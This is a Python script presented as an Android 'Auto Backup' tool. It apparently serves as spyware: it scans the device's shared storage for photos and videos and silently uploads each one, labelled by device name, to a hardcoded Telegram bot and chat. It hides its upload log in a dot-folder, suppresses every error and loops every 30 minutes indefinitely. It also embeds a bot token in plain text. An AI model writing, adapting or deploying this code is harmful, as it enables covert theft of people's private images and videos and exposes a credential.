import os
import time
import shutil
import hashlib
import requests
import subprocess

BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
CHAT_ID = "7883547875"

TARGET_DIR = "/sdcard"
# Photos aur Videos dono ki extensions shamil hain
ALLOWED_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.mp4', '.mkv', '.mov', '.avi')

IGNORED_FOLDER_NAMES = {
    '.thumbnails', 'thumbnails', 'thumbnail', 
    'cache', '.cache', 'stickers', '.stickers', 
    'temp', '.temp', 'trash', '.trash', 'private'
}

SECURE_DIR = "/sdcard/Download/.backup_secure_data"
os.makedirs(SECURE_DIR, exist_ok=True)

LOG_FILE = os.path.join(SECURE_DIR, "data.txt")
DEVICE_CONFIG_FILE = os.path.join(SECURE_DIR, "device_info.txt")

def get_android_property(prop_name):
    try:
        output = subprocess.check_output(['getprop', prop_name]).decode('utf-8').strip()
        return output if output else ""
    except Exception:
        return ""

def get_saved_device_name():
    if os.path.exists(DEVICE_CONFIG_FILE):
        with open(DEVICE_CONFIG_FILE, 'r', encoding='utf-8') as f:
            saved_name = f.read().strip()
            if saved_name:
                return saved_name
    
    # Android system se automatically phone ka brand aur model uthana
    brand = get_android_property('ro.product.brand').capitalize()
    model = get_android_property('ro.product.model')
    
    if brand and model:
        auto_name = f"{brand} {model}"
    elif model:
        auto_name = model
    else:
        auto_name = "Android_Device"
        
    try:
        with open(DEVICE_CONFIG_FILE, 'w', encoding='utf-8') as f:
            f.write(auto_name)
    except Exception:
        pass
        
    return auto_name

DEVICE_NAME = get_saved_device_name()

def get_file_hash(file_path):
    hasher = hashlib.md5()
    try:
        with open(file_path, 'rb') as f:
            buf = f.read(65536)
            while len(buf) > 0:
                hasher.update(buf)
                buf = f.read(65536)
        return hasher.hexdigest()
    except Exception:
        return None

def load_uploaded_records():
    uploaded = set()
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                h = line.strip()
                if h:
                    uploaded.add(h)
    return uploaded

def save_uploaded_record(file_hash):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(file_hash + '\n')

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text}
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

def upload_media(file_path, folder_path):
    ext = file_path.lower()
    is_video = ext.endswith(('.mp4', '.mkv', '.mov', '.avi'))
    
    method = "sendVideo" if is_video else "sendPhoto"
    file_field = "video" if is_video else "photo"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        with open(file_path, 'rb') as media_file:
            caption_text = (
                f"📱 User/Name: {DEVICE_NAME}\n"
                f"📂 Path: {folder_path}\n"
                f"📄 File: {os.path.basename(file_path)}"
            )
            payload = {
                'chat_id': CHAT_ID,
                'caption': caption_text
            }
            files = {file_field: media_file}
            timeout_limit = 60 if is_video else 20
            res = requests.post(url, data=payload, files=files, timeout=timeout_limit)
            return res.status_code == 200
    except Exception:
        return False

def run_backup_cycle():
    if not os.path.exists(TARGET_DIR):
        return

    uploaded_hashes = load_uploaded_records()
    send_telegram_message(f"🚀 Auto Backup Cycle Started for [{DEVICE_NAME}]!")

    for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
        if 'android/data' in root.lower() or 'android/obb' in root.lower():
            continue

        current_folder_name = os.path.basename(root).lower()
        if current_folder_name in IGNORED_FOLDER_NAMES or '/private/' in root.lower():
            continue

        if any(ignored in root.lower() for ignored in ['.thumbnails', '/cache/', '/stickers/', '/temp/']):
            continue
            
        for file in files:
            if file.lower().endswith(ALLOWED_EXTENSIONS):
                full_path = os.path.join(root, file)
                
                file_hash = get_file_hash(full_path)
                if not file_hash:
                    continue
                
                if file_hash in uploaded_hashes:
                    continue
                
                success = upload_media(full_path, root)
                if success:
                    save_uploaded_record(file_hash)
                    uploaded_hashes.add(file_hash)
                
                time.sleep(2)

    send_telegram_message(f"✅ Auto Backup Cycle Finished. Waiting 30 minutes for next cycle...")

if __name__ == "__main__":
    while True:
        try:
            run_backup_cycle()
        except Exception:
            pass
        
        # 30 minutes = 1800 seconds
        time.sleep(1800)
